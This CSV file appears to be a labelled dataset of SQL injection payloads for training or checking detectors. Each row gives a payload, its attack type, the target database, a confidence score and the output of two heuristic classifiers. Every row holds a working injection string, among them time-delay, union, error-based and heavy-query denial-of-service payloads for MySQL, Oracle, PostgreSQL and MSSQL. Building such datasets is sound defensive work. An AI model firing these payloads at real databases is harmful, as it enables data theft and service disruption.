payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
-9564 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),error_based,oracle,0.9,xmltype() for Oracle error-based,KEEP,,error_based,oracle,860,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,-9564 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )
"1"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( ""epfg"" like ""epfg",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,861,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( ""epfg"" like ""epfg"
"1' ) and make_set ( 8403 = 8403,8899 ) and ( 'ojag' = 'ojag",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,862,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1' ) and make_set ( 8403 = 8403,8899 ) and ( 'ojag' = 'ojag"
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) )",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,863,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) )"
"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,864,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#"
1 where 4641 = 4641,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,865,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 where 4641 = 4641
"1 ) as estm where 4809 = 4809 union all select null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,866,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) as estm where 4809 = 4809 union all select null,null,null--"
( select ( case when ( 9263 = 9263 ) then 1 else 9263* ( select 9263 from mysql.db ) end ) ),boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,867,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,( select ( case when ( 9263 = 9263 ) then 1 else 9263* ( select 9263 from mysql.db ) end ) )
"1 ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,868,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"1 ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 8898 = 8898",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,869,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1 ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 8898 = 8898"
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ""%"" = """,time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,870,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ""%"" = """
1 where 6223 = 6223 rlike sleep ( 5 ) #,time_blind,generic,0.9,sleep() with rlike for time blind,KEEP,,time_blind,generic,871,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1 where 6223 = 6223 rlike sleep ( 5 ) #
"1%"" ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ""%"" = """,time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,872,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1%"" ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ""%"" = """
-5962 ) ) as jbqv where 2583 = 2583 or 7496 = 8560--,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,873,boolean_blind,generic,Pattern match: 'or 7496 = 8560' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-5962 ) ) as jbqv where 2583 = 2583 or 7496 = 8560--
"-1244 ) as qszw where 2332 = 2332 union all select 2332,2332,2332,2332#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,874,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1244 ) as qszw where 2332 = 2332 union all select 2332,2332,2332,2332#"
( select ( case when ( 9856 = 9856 ) then sleep ( 5 ) else 9856* ( select 9856 from information_schema.character_sets ) end ) ),time_blind,mysql,0.9,sleep() with CASE for time blind,KEEP,,time_blind,mysql,875,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,( select ( case when ( 9856 = 9856 ) then sleep ( 5 ) else 9856* ( select 9856 from information_schema.character_sets ) end ) )
"1"" ) ) as mlid where 1047 = 1047 union all select null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,876,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) ) as mlid where 1047 = 1047 union all select null,null#"
-7532 ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 8332 = 8332,error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,877,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,-7532 ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 8332 = 8332
"1"" ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,878,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) ) union all select null,null,null,null,null,null,null,null,null--"
"1' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 'xwhi' = 'xwhi",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,879,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 'xwhi' = 'xwhi"
1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'prjf' = 'prjf,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,880,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'prjf' = 'prjf
1' ) as jdmh where 6175 = 6175 rlike sleep ( 5 ) #,time_blind,generic,0.9,sleep() with rlike for time blind,KEEP,,time_blind,generic,881,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) as jdmh where 6175 = 6175 rlike sleep ( 5 ) #
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""qwdi"" = ""qwdi",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,882,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""qwdi"" = ""qwdi"
1' in boolean mode ) union all select null--,union_based,generic,0.85,UNION in boolean mode for union-based,KEEP,,union_based,generic,883,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,1' in boolean mode ) union all select null--
"-3071 ) ) as uiiu where 8910 = 8910 union all select 8910,8910,8910,8910,8910,8910,8910#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,884,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3071 ) ) as uiiu where 8910 = 8910 union all select 8910,8910,8910,8910,8910,8910,8910#"
1 where 5161 = 5161 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,error_based,oracle,0.9,xmltype() for Oracle error-based,KEEP,,error_based,oracle,885,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,1 where 5161 = 5161 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --
1 ) ) ) rlike ( select ( case when ( 4367 = 6879 ) then 1 else 0x28 end ) ) and ( ( ( 2542 = 2542,boolean_blind,generic,0.8,rlike() for boolean blind,KEEP,,boolean_blind,generic,886,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1 ) ) ) rlike ( select ( case when ( 4367 = 6879 ) then 1 else 0x28 end ) ) and ( ( ( 2542 = 2542
"1"" ) as rovd where 3764 = 3764 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,887,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" ) as rovd where 3764 = 3764 and elt ( 4249 = 4249,7259 ) --"
select sleep ( 5 ) and ( 'dcys' like 'dcys,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,888,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) and ( 'dcys' like 'dcys
1 ) as msat where 1267 = 1267,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,889,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as msat where 1267 = 1267
1 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,890,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,1 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) )
"1%"" ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,891,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1%"" ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --"
1 where 8506 = 8506,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,892,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 where 8506 = 8506
1' ) as qcse where 4147 = 4147 waitfor delay '0:0:5'--,time_blind,mssql,0.9,waitfor delay for MSSQL time blind,KEEP,,time_blind,mssql,893,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1' ) as qcse where 4147 = 4147 waitfor delay '0:0:5'--
1' ) as inid where 7812 = 7812 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,894,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' ) as inid where 7812 = 7812 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --
"1%' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( '%' = '",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,895,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1%' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( '%' = '"
"1' ) where 1577 = 1577 union all select null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,896,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) where 1577 = 1577 union all select null,null,null,null,null,null#"
waitfor delay '0:0:5' and ( ( 'nvqf' = 'nvqf,time_blind,mssql,0.9,waitfor delay for MSSQL time blind,KEEP,,time_blind,mssql,897,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,waitfor delay '0:0:5' and ( ( 'nvqf' = 'nvqf
"1"" ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( ""ftjg"" = ""ftjg",error_based,mysql,0.85,extractvalue() with procedure analyse,KEEP,,error_based,mysql,898,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( ""ftjg"" = ""ftjg"
1' where 7036 = 7036,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,899,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' where 7036 = 7036
select case when 2640 = 9249 then 1 else null end--,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,900,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 2640 = 9249 then 1 else null end--
"1' where 1836 = 1836 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,901,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' where 1836 = 1836 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --"
1' ) ) as mqnv where 9831 = 9831,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,902,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as mqnv where 9831 = 9831
select ( case when ( 8331 = 5625 ) then 8331 else 8331* ( select 8331 from mysql.db ) end ) #,boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,903,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 8331 = 5625 ) then 8331 else 8331* ( select 8331 from mysql.db ) end ) #
1' ) and 3560 = 5467--,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,904,boolean_blind,generic,Pattern match: 'and 3560 = 5467' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' ) and 3560 = 5467--
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( '%' = '",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,905,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( '%' = '"
"-6632 ) union all select 4073,4073,4073,4073,4073,4073,4073,4073--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,906,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6632 ) union all select 4073,4073,4073,4073,4073,4073,4073,4073--"
-8513' union all select 7414--,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,907,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-8513' union all select 7414--
"-9934"" ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""xecb"" like ""xecb",error_based,oracle,0.9,ctxsys.drithsx for Oracle error-based,KEEP,,error_based,oracle,908,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"-9934"" ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""xecb"" like ""xecb"
1' ) ) as ypgz where 8704 = 8704,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,909,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as ypgz where 8704 = 8704
"-5726%"" ) ) or 6872 = 6872 and ( ( ""%"" = """,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,910,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-5726%"" ) ) or 6872 = 6872 and ( ( ""%"" = """
"1%' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( '%' = '",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,911,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1%' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( '%' = '"
1 where 1299 = 1299,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,912,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 where 1299 = 1299
1 ) ) and sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,913,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1 ) ) and sleep ( 5 ) #
-6529' ) or ( 4309 = 1601 ) *1601,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,914,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-6529' ) or ( 4309 = 1601 ) *1601
select pg_sleep ( 5 ) -- ojzt,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,915,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,select pg_sleep ( 5 ) -- ojzt
begin dbms_lock.sleep ( 5 ),time_blind,oracle,0.9,dbms_lock.sleep for Oracle time blind,KEEP,,time_blind,oracle,916,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,time_blind,mysql,time function 'dbms_lock.sleep' detected,begin dbms_lock.sleep ( 5 )
select ( case when ( 9562 = 5996 ) then 1 else 9562* ( select 9562 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.8,CASE WHEN for MSSQL blind,KEEP,,boolean_blind,mssql,917,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal,select ( case when ( 9562 = 5996 ) then 1 else 9562* ( select 9562 from master..sysdatabases ) end ) --
"1%' ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,918,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1%' ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --"
1' ) where 2208 = 2208 rlike sleep ( 5 ) #,time_blind,generic,0.9,sleep() with rlike for time blind,KEEP,,time_blind,generic,919,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) where 2208 = 2208 rlike sleep ( 5 ) #
"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and 'gkku' like 'gkku",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,920,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and 'gkku' like 'gkku"
"select * from generate_series ( 4592,4592,case when ( 4592 = 4592 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,0.8,generate_series for boolean blind,KEEP,,boolean_blind,postgresql,921,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal,"select * from generate_series ( 4592,4592,case when ( 4592 = 4592 ) then 1 else 0 end ) limit 1--"
"iif ( 1157 = 4542,1,1/0 )",boolean_blind,mssql,0.85,iif() for MSSQL boolean blind,KEEP,,boolean_blind,mssql,922,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"iif ( 1157 = 4542,1,1/0 )"
"-9039' ) union all select 8058,8058,8058,8058,8058--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,923,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9039' ) union all select 8058,8058,8058,8058,8058--"
1 and ( 3020 = 3020 ) *6703# syuj,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,924,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1 and ( 3020 = 3020 ) *6703# syuj
